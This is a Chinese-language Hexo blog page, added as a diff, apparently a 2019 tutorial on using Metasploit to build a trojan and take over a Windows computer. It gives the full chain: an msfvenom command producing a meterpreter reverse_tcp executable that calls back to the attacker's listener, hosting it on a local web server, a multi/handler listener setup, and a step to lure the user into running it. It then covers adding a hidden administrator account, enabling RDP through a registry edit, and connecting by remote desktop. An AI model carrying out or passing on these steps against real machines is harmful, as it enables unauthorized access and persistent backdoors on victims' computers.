@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>利用msf生成木马入侵电脑 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="介绍：Metasploit (MSF)综合利用工具，集成上千种漏洞利用方式，操作简单易上手。Kali自带的，依赖于postgresql数据库">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用msf生成木马入侵电脑">
+<meta property="og:url" content="http://yoursite.com/2019/03/17/利用msf生成木马入侵电脑/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="介绍：Metasploit (MSF)综合利用工具，集成上千种漏洞利用方式，操作简单易上手。Kali自带的，依赖于postgresql数据库">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190317165100.png">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190317165125.png">
+<meta property="og:image" content="http://yoursite.com/img/999999.png">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190317165221.png">
+<meta property="og:image" content="http://yoursite.com/img/20190317172312.png">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190317165850.png">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190317170017.png">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190317173002.png">
+<meta property="og:image" content="http://yoursite.com/img/110.png">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190317173315.png">
+<meta property="og:updated_time" content="2019-04-22T09:21:58.635Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用msf生成木马入侵电脑">
+<meta name="twitter:description" content="介绍：Metasploit (MSF)综合利用工具，集成上千种漏洞利用方式，操作简单易上手。Kali自带的，依赖于postgresql数据库">
+<meta name="twitter:image" content="http://yoursite.com/img/QQ截图20190317165100.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-利用msf生成木马入侵电脑" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/17/利用msf生成木马入侵电脑/" class="article-date">
+  <time datetime="2019-03-17T09:38:33.000Z" itemprop="datePublished">2019-03-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      利用msf生成木马入侵电脑
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="介绍：Metasploit-MSF"><a href="#介绍：Metasploit-MSF" class="headerlink" title="介绍：Metasploit (MSF)"></a>介绍：Metasploit (MSF)</h4><h4 id="综合利用工具，集成上千种漏洞利用方式，操作简单易上手。"><a href="#综合利用工具，集成上千种漏洞利用方式，操作简单易上手。" class="headerlink" title="综合利用工具，集成上千种漏洞利用方式，操作简单易上手。"></a>综合利用工具，集成上千种漏洞利用方式，操作简单易上手。</h4><h4 id="Kali自带的，依赖于postgresql数据库"><a href="#Kali自带的，依赖于postgresql数据库" class="headerlink" title="Kali自带的，依赖于postgresql数据库"></a>Kali自带的，依赖于postgresql数据库</h4><a id="more"></a>
+<hr>
+<ul>
+<li><p>[ ] 利用msf生成木马</p>
+</li>
+<li><p>[ ] 投放木马至目标机</p>
+</li>
+<li><p>[ ] 监听</p>
+</li>
+<li><p>[ ] 控制，入侵</p>
+<hr>
+<h2 id="一-利用MSF生成木马"><a href="#一-利用MSF生成木马" class="headerlink" title="一.利用MSF生成木马"></a>一.利用MSF生成木马</h2><ol>
+<li><p>首先打开postgresql数据库。打开终端输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure>
+<p><img src="/img/QQ截图20190317165100.png" alt></p>
+</li>
+<li><p>打开msf:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<p><img src="/img/QQ截图20190317165125.png" alt></p>
+</li>
+<li><p>生成木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.179.141 lport=8787 -f exe &gt;./pppp.exe</span><br></pre></td></tr></table></figure>
+<h6 id><a href="#" class="headerlink" title></a><img src="/img/999999.png" alt></h6></li>
+</ol>
+</li>
+</ul>
+<h3 id="二，投放木马"><a href="#二，投放木马" class="headerlink" title="二，投放木马"></a>二，投放木马</h3><ol>
+<li><p>建立本地站点:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 192.168.179.142:8080</span><br></pre></td></tr></table></figure>
+<p><img src="/img/QQ截图20190317165221.png" alt></p>
+<p>2.靶机下上投放病毒如图</p>
+<p><img src="/img/20190317172312.png" alt></p>
+<h3 id="三-监听"><a href="#三-监听" class="headerlink" title="三.监听"></a>三.监听</h3><ol>
+<li><p>启用MSF，加载exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
+<p>加载payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+<p><img src="/img/QQ截图20190317165850.png" alt></p>
+</li>
+<li><p>查看参数并修改本地地址和监听端口，输入代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+<p>设置本地IP 和监听端口 ，运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set  lhost 192.168.179.141</span><br><span class="line">set lport 8787</span><br></pre></td></tr></table></figure>
+<p><img src="/img/QQ截图20190317170017.png" alt></p>
+</li>
+<li><p>诱使客户点击我们投放的PPPP木马</p>
+<h3 id="三-控制入侵"><a href="#三-控制入侵" class="headerlink" title="三.控制入侵"></a>三.控制入侵</h3><ol>
+<li><p>用户点击木马后 我们到提示</p>
+<p><img src="/img/QQ截图20190317173002.png" alt></p>
+</li>
+<li><p>输入shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<pre><code>3. 添加用户并添加到管理组：
+
+   ![](/img/aaa.png)
+
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user desk 123.com /add</span><br><span class="line">net localgroup administators desk /add</span><br></pre></td></tr></table></figure>
+</code></pre><p>​<br>​<br>​         ### 四，监听控制<br>​    </p>
+<pre><code>1. 开启3389远程端口
+
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+
+2. 连接远程桌面,输入：
+
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.179.142</span><br></pre></td></tr></table></figure>
+</code></pre><p>​                            <img src="/img/110.png" alt>                         </p>
+<p>​                         3.登录win：</p>
+<p>​                                    <img src="/img/QQ截图20190317173315.png" alt></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/03/17/利用msf生成木马入侵电脑/" data-id="cjv2e6o4v0009nwwfzr0na7oq" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/03/27/Cobalt-Strike渗透工具/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+           Cobalt Strike渗透工具
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/03/17/永恒之蓝/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">永恒之蓝</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/04/29/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/28/一句话木马及变形/">一句话木马及变形</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/28/文件上传的七种姿势/">文件上传的七种姿势</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/15/DNSLOG在盲注中的使用/">DNSLOG在盲注中的使用</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/sql注入-二/">sql注入(二)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
